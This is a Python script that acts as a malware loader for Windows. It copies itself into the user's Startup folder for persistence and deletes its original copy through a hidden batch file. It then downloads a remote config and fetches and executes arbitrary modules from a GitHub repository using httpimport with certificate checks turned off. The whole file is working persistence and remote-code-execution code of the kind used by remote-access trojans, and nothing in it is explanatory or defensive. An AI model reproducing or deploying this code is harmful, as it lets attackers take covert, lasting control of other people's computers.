def run():
    import requests, httpimport, json
    import threading, os, sys, shutil

    ORIGINAL = os.getcwd()

    #check if we are in startup
    start_path = "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    if not os.path.basename(os.path.abspath(sys.argv[0])) in os.listdir(start_path):
        #add to startup
        shutil.copyfile(os.path.abspath(sys.argv[0]), os.path.join(start_path, os.path.basename(os.path.abspath(sys.argv[0]))))
        os.chdir(start_path)
        #run the module
        os.system("start " + os.path.basename(os.path.abspath(sys.argv[0])))
        #write a file to temp
        os.chdir("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/")
        with open("delete.cmd", "w") as f:
            f.write("@ECHO off\ntimeout 5\ndel " + os.path.join(ORIGINAL, os.path.basename(sys.argv[0])))
        os.system('powershell "start delete.cmd" -WindowStyle Hidden"')

    elif os.path.dirname(os.path.abspath(sys.argv[0])) == start_path: #dont execute if not the startup one
        config_url = "CONFIG_URL"
        config_text = requests.get(config_url).text
        config = json.loads(config_text)
        for module_name in config["modules"]:
            if config["threaded_modules"]:
                def run(module):
                    httpimport.INSECURE = True
                    with httpimport.github_repo(config["module_config"]["github_username"], config["module_config"]["github_repo"], module):
                        exec(f"import {module}\n{module}.run()")
                
                threading.Thread(target=run, args=(module_name,)).start()
            else:
                run(module_name)
        #wait forever
        while True: pass